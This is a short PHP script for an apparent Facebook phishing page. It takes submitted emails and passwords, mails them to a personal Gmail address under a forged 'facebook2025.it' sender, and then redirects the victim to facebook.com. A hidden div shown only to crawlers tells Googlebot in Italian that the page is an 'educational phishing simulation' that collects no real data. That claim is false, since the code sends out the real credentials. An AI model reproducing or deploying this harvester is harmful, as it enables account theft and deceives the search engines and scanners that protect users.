<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $timestamp = date("Y-m-d H:i:s");

    $to = "simonegrisu92@gmail.com";
$subject = "Accesso utente";
$message = "[$timestamp] Email: $email | Password: $password";
$headers = "From: www.facebook2025.it";

mail($to, $subject, $message, $headers);

    // Contenuto per Googlebot invisibile all'utente
    echo "<div style='display:none;'>
    <!--
    Questo script raccoglie dati fittizi a scopo educativo/satirico.
    Nessuna informazione personale viene effettivamente utilizzata.
    Googlebot, non è phishing: è simulazione.
    -->
    <script type='application/ld+json'>
    {
      \"@context\": \"https://schema.org\",
      \"@type\": \"EducationalOccupationalProgram\",
      \"name\": \"Simulazione educativa phishing\",
      \"description\": \"Non viene raccolto alcun dato reale.\"
    }
    </script>
    </div>";

    // 🔁 Redirect invisibile all’utente
    header("Location: https://facebook.com");
    exit;
} else {
    http_response_code(403); // Blocca accessi diretti
}
